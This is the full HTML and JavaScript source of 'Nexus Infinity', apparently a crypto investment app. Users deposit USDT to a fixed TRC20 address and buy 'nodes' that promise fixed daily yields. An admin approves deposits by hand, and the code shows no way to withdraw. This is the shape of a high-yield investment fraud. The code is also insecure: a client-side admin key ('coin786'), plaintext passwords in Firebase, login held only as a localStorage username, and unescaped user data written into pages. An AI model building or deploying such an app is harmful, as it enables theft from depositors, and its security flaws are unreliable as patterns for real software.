<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Neon Premium</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Syncopate:wght@400;700&family=Inter:wght@300;500;800&display=swap');
        
        :root {
            --neon-red: #ff003c;
            --neon-pink: #ff00ff;
            --deep-black: #050505;
            --glass: rgba(15, 15, 15, 0.7);
        }

        body {
            background-color: var(--deep-black);
            color: white;
            font-family: 'Inter', sans-serif;
            margin: 0;
            overflow-x: hidden;
        }

        /* Animated Background Gradient */
        .neon-bg {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at 50% -20%, #300010, transparent),
                        radial-gradient(circle at 0% 100%, #100020, transparent);
            z-index: -1;
        }

        /* Premium Glassmorphism */
        .neon-card {
            background: var(--glass);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 0, 60, 0.2);
            border-radius: 24px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .neon-card:hover {
            border-color: var(--neon-pink);
            box-shadow: 0 0 20px rgba(255, 0, 255, 0.2);
        }

        /* Typography */
        .heading-font { font-family: 'Syncopate', sans-serif; text-transform: uppercase; letter-spacing: 2px; }
        
        /* Neon Buttons */
        .btn-neon {
            background: linear-gradient(90deg, var(--neon-red), var(--neon-pink));
            color: white;
            font-weight: 800;
            text-transform: uppercase;
            padding: 16px;
            border-radius: 16px;
            border: none;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(255, 0, 60, 0.4);
            transition: 0.3s;
        }

        .btn-neon:active { transform: scale(0.95); box-shadow: 0 0 25px var(--neon-pink); }

        /* Custom Inputs */
        .neon-input {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 14px;
            padding: 14px;
            color: white;
            outline: none;
            transition: 0.3s;
        }
        .neon-input:focus { border-color: var(--neon-red); background: rgba(255, 0, 60, 0.05); }

        /* Animations */
        @keyframes glow { 0%, 100% { opacity: 0.8; } 50% { opacity: 1; filter: drop-shadow(0 0 10px var(--neon-red)); } }
        .logo-glow { animation: glow 3s infinite; }

        .nav-item { color: #666; transition: 0.3s; cursor: pointer; text-align: center; font-size: 10px; font-weight: 700; }
        .nav-item.active { color: var(--neon-red); text-shadow: 0 0 10px var(--neon-red); }

        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div class="neon-bg"></div>

    <div id="splash" class="fixed inset-0 bg-black z-[9999] flex flex-col items-center justify-center">
        <div class="w-20 h-20 bg-gradient-to-tr from-[#ff003c] to-[#ff00ff] rounded-3xl flex items-center justify-center text-4xl font-black logo-glow">N</div>
        <h1 class="heading-font text-white mt-6 text-sm tracking-widest italic">Nexus<span class="text-[#ff003c]">Infinity</span></h1>
    </div>

    <div id="auth-section" class="min-h-screen flex items-center justify-center p-8 hidden">
        <div class="w-full max-w-sm space-y-12">
            <div id="logo-tap" class="w-24 h-24 bg-zinc-900 rounded-[2.5rem] mx-auto flex items-center justify-center text-5xl font-black border-t border-white/10 shadow-2xl cursor-pointer">
                <span class="bg-gradient-to-b from-[#ff003c] to-[#ff00ff] bg-clip-text text-transparent">N</span>
            </div>
            
            <div id="login-ui" class="space-y-4">
                <input type="text" id="l-user" placeholder="Terminal ID" class="neon-input w-full">
                <input type="password" id="l-pass" placeholder="Security Key" class="neon-input w-full">
                <button onclick="handleLogin()" class="btn-neon w-full">Authorize</button>
                <p onclick="toggleAuth(true)" class="text-center text-[10px] font-bold text-zinc-500 uppercase tracking-tighter cursor-pointer">Register Identity</p>
            </div>
            
            <div id="signup-ui" class="space-y-4 hidden">
                <input type="text" id="s-user" placeholder="Username" class="neon-input w-full">
                <input type="password" id="s-pass" placeholder="Password" class="neon-input w-full">
                <button onclick="handleSignup()" class="btn-neon w-full">Initialize</button>
                <p onclick="toggleAuth(false)" class="text-center text-[10px] font-bold text-zinc-500 uppercase tracking-tighter cursor-pointer">Back to Terminal</p>
            </div>
        </div>
    </div>

    <div id="dashboard-section" class="hidden pb-24">
        <nav class="p-6 flex justify-between items-center border-b border-white/5 backdrop-blur-md sticky top-0 z-[500]">
            <div class="flex items-center gap-3">
                <div id="admin-trigger" class="w-10 h-10 bg-zinc-900 rounded-xl flex items-center justify-center text-xl font-black border border-white/5">N</div>
                <div class="leading-none">
                    <p class="text-[8px] font-black text-zinc-500 uppercase">Status: Active</p>
                    <p id="nav-user" class="text-sm font-extrabold italic tracking-tighter">...</p>
                </div>
            </div>
            <button onclick="logout()" class="text-zinc-500"><i class="fa-solid fa-power-off"></i></button>
        </nav>

        <div id="page-home" class="p-6 space-y-6">
            <div class="neon-card p-8 relative overflow-hidden">
                <div class="absolute top-0 right-0 p-4 opacity-10 text-6xl font-black italic">N</div>
                <p class="text-[9px] font-black text-zinc-400 uppercase tracking-widest mb-2">Institutional Balance</p>
                <h2 id="balance-txt" class="text-5xl font-black italic tracking-tighter text-white">$0.00</h2>
                
                <div class="mt-8 flex justify-between items-end border-t border-white/5 pt-6">
                    <div>
                        <p class="text-[8px] font-black text-zinc-500 uppercase">Yield Reset</p>
                        <p id="timer" class="text-lg font-black text-[#ff003c] tabular-nums">23:59:59</p>
                    </div>
                    <div class="text-right">
                        <p class="text-[8px] font-black text-zinc-500 uppercase">Total Profit</p>
                        <p id="profit-txt" class="text-xl font-black text-[#ff00ff]">+$0.00</p>
                    </div>
                </div>
            </div>

            <div class="flex justify-between items-center">
                <h3 class="heading-font text-[10px] text-zinc-400">Deployed Nodes</h3>
                <span class="text-[10px] font-black text-[#ff003c]">LIVE SYNC</span>
            </div>
            <div id="active-nodes-list" class="space-y-4">
                <div class="neon-card p-6 text-center text-zinc-500 text-[10px] italic">Awaiting node deployment...</div>
            </div>
        </div>

        <div id="page-finance" class="p-6 space-y-6 hidden">
            <h3 class="heading-font text-lg">Asset Management</h3>
            <div class="neon-card p-6 space-y-4">
                <div class="bg-black/40 p-4 rounded-xl border border-white/5">
                    <p class="text-[8px] text-zinc-500 uppercase font-black">Recharge Address (TRC20)</p>
                    <p class="text-[10px] font-bold text-[#ff00ff] break-all">TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76</p>
                </div>
                <input type="number" id="dep-amt" placeholder="Deposit Amount" class="neon-input w-full">
                <input type="text" id="dep-tid" placeholder="TID / Hash" class="neon-input w-full">
                <input type="file" id="dep-proof" class="text-[10px] text-zinc-500">
                <button onclick="submitDep()" class="btn-neon w-full">Inject Capital</button>
            </div>
        </div>

        <div id="page-nodes" class="p-6 space-y-6 hidden">
            <h3 class="heading-font text-lg">Node Protocol</h3>
            <div id="nodes-market" class="grid gap-4"></div>
        </div>

        <div id="page-history" class="p-6 space-y-6 hidden">
            <h3 class="heading-font text-lg">Terminal History</h3>
            <div id="history-list" class="space-y-3"></div>
        </div>

        <div class="fixed bottom-0 left-0 right-0 bg-black/80 backdrop-blur-xl border-t border-white/5 p-4 flex justify-around items-center z-[1000]">
            <div onclick="switchPage('home')" class="nav-item active"><i class="fa-solid fa-ghost block text-xl mb-1"></i>CORE</div>
            <div onclick="switchPage('nodes')" class="nav-item"><i class="fa-solid fa-microchip block text-xl mb-1"></i>NODES</div>
            <div onclick="switchPage('finance')" class="nav-item"><i class="fa-solid fa-bolt block text-xl mb-1"></i>CASH</div>
            <div onclick="switchPage('history')" class="nav-item"><i class="fa-solid fa-list block text-xl mb-1"></i>LOGS</div>
        </div>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#050505] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="heading-font text-[#ff003c]">Admin Terminal</h2>
            <button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-3xl">&times;</button>
        </div>
        <div id="admin-content" class="space-y-6">
            <div id="admin-dep-list" class="space-y-4"></div>
            <div id="admin-with-list" class="space-y-4"></div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
          apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0",
          authDomain: "live-54fb4.firebaseapp.com",
          databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com",
          projectId: "live-54fb4",
          storageBucket: "live-54fb4.firebasestorage.app",
          messagingSenderId: "781910562842",
          appId: "1:781910562842:web:07a887f860d30fd17d99a3"
        };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // Nodes Configuration
        const nodes = Array.from({length: 15}, (_, i) => ({
            id: i + 1,
            title: `Neon Node 0${i + 1}`,
            price: (i + 1) * 25,
            daily: ((i + 1) * 2.2).toFixed(2)
        }));

        // Secret Admin Access
        let tap = 0;
        document.getElementById('admin-trigger').onclick = document.getElementById('logo-tap').onclick = () => {
            tap++;
            if(tap === 4) {
                if(prompt("Security Key:") === "coin786") {
                    document.getElementById('admin-panel').classList.remove('hidden');
                    loadAdmin();
                }
                tap = 0;
            }
            setTimeout(() => tap = 0, 2000);
        };

        window.onload = () => {
            renderNodes();
            setInterval(() => {
                const now = new Date();
                document.getElementById('timer').innerText = `${23-now.getHours()}:${59-now.getMinutes()}:${59-now.getSeconds()}`;
            }, 1000);
            setTimeout(() => {
                document.getElementById('splash').style.display = 'none';
                const u = localStorage.getItem('nexus_user');
                if(u) showDashboard(u);
                else document.getElementById('auth-section').classList.remove('hidden');
            }, 2500);
        };

        function renderNodes() {
            document.getElementById('nodes-market').innerHTML = nodes.map(n => `
                <div class="neon-card p-6 flex justify-between items-center">
                    <div>
                        <p class="text-[8px] font-black text-zinc-500 uppercase tracking-widest">${n.title}</p>
                        <h4 class="text-2xl font-black italic">$${n.price}</h4>
                        <p class="text-[9px] font-bold text-[#ff00ff]">Yield: $${n.daily}/day</p>
                    </div>
                    <button onclick="buyNode(${n.id})" class="btn-neon px-6 py-3 text-[10px]">Deploy</button>
                </div>
            `).join('');
        }

        window.buyNode = async (id) => {
            const user = localStorage.getItem('nexus_user');
            const node = nodes.find(n => n.id === id);
            const snap = await get(ref(db, `users/${user}`));
            const bal = snap.val().balance || 0;
            if(bal < node.price) return alert("Capital Required!");
            await update(ref(db, `users/${user}`), { balance: bal - node.price });
            await push(ref(db, `users/${user}/activeNodes`), { ...node, date: new Date().toLocaleString() });
            alert("Node Synchronized!");
            switchPage('home');
        };

        function showDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard-section').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid;

            onValue(ref(db, `users/${uid}`), (snap) => {
                const data = snap.val();
                if(!data) return;
                document.getElementById('balance-txt').innerText = '$' + (data.balance || 0).toLocaleString();
                document.getElementById('profit-txt').innerText = '+$' + (data.profit || 0).toLocaleString();
                
                if(data.activeNodes) {
                    document.getElementById('active-nodes-list').innerHTML = Object.values(data.activeNodes).map(n => `
                        <div class="neon-card p-5 border-l-4 border-[#ff003c] flex justify-between">
                            <div><p class="text-[10px] font-black uppercase text-white">${n.title}</p><p class="text-[8px] text-zinc-500">Yielding: $${n.daily}/d</p></div>
                            <span class="text-[8px] font-black text-green-500 italic">SECURE</span>
                        </div>
                    `).join('');
                }
                
                if(data.history) {
                    document.getElementById('history-list').innerHTML = Object.values(data.history).reverse().map(h => `
                        <div class="neon-card p-4 flex justify-between items-center bg-white/5">
                            <div><p class="text-[10px] font-black uppercase">${h.type}</p><p class="text-[7px] text-zinc-500">${h.date}</p></div>
                            <div class="text-right">
                                <p class="text-[10px] font-bold text-white">$${h.amount}</p>
                                <span class="text-[8px] font-black uppercase text-[#ff003c]">${h.status}</span>
                            </div>
                        </div>
                    `).join('');
                }
            });
        }

        window.submitDep = async () => {
            const user = localStorage.getItem('nexus_user');
            const amt = document.getElementById('dep-amt').value;
            const tid = document.getElementById('dep-tid').value;
            const file = document.getElementById('dep-proof').files[0];
            if(!amt || !tid || !file) return alert("Fill data!");
            const reader = new FileReader(); reader.readAsDataURL(file);
            reader.onload = async () => {
                const hRef = push(ref(db, `users/${user}/history`));
                const entry = { user, amount: amt, status: 'pending', date: new Date().toLocaleString(), type: 'deposit', proof: reader.result, tid };
                await set(hRef, entry);
                await set(ref(db, `admin/deposits/${hRef.key}`), entry);
                alert("Protocol Logged!");
                switchPage('history');
            };
        };

        // Admin Helpers
        function loadAdmin() {
            onValue(ref(db, 'admin/deposits'), (snap) => {
                const data = snap.val();
                document.getElementById('admin-dep-list').innerHTML = data ? Object.entries(data).map(([id, d]) => `
                    <div class="neon-card p-4 space-y-3">
                        <p class="text-xs">User: ${d.user} | $${d.amount}</p>
                        <img src="${d.proof}" class="w-full h-40 rounded object-cover border border-white/10">
                        <div class="flex gap-2">
                            <button onclick="approveDep('${id}','${d.user}',${d.amount})" class="bg-green-600 text-[10px] flex-1 py-2 rounded">Approve</button>
                            <button onclick="rejectDep('${id}')" class="bg-red-600 text-[10px] flex-1 py-2 rounded">Reject</button>
                        </div>
                    </div>
                `).join('') : '<p class="text-center text-xs">No pending tasks</p>';
            });
        }

        window.approveDep = async (id, u, a) => {
            const snap = await get(ref(db, `users/${u}`));
            await update(ref(db, `users/${u}`), { balance: (snap.val().balance || 0) + parseFloat(a) });
            await remove(ref(db, `admin/deposits/${id}`));
            alert("Approved!");
        };

        window.handleSignup = async () => {
            const u = document.getElementById('s-user').value.trim();
            const p = document.getElementById('s-pass').value.trim();
            if(!u || !p) return alert("Error!");
            await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0 });
            alert("ID Created!"); toggleAuth(false);
        };

        window.handleLogin = async () => {
            const u = document.getElementById('l-user').value.trim();
            const p = document.getElementById('l-pass').value.trim();
            const snap = await get(ref(db, `users/${u}`));
            if(snap.exists() && snap.val().password === p) { localStorage.setItem('nexus_user', u); showDashboard(u); }
            else alert("Unauthorized!");
        };

        window.switchPage = (p) => {
            ['home', 'nodes', 'finance', 'history'].forEach(pg => document.getElementById('page-'+pg).classList.add('hidden'));
            document.getElementById('page-'+p).classList.remove('hidden');
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
            if(event) event.currentTarget.classList.add('active');
        };

        window.toggleAuth = (s) => {
            document.getElementById('login-ui').classList.toggle('hidden', s);
            document.getElementById('signup-ui').classList.toggle('hidden', !s);
        };
        window.logout = () => { localStorage.clear(); location.reload(); };
    </script>
</body>
</html>
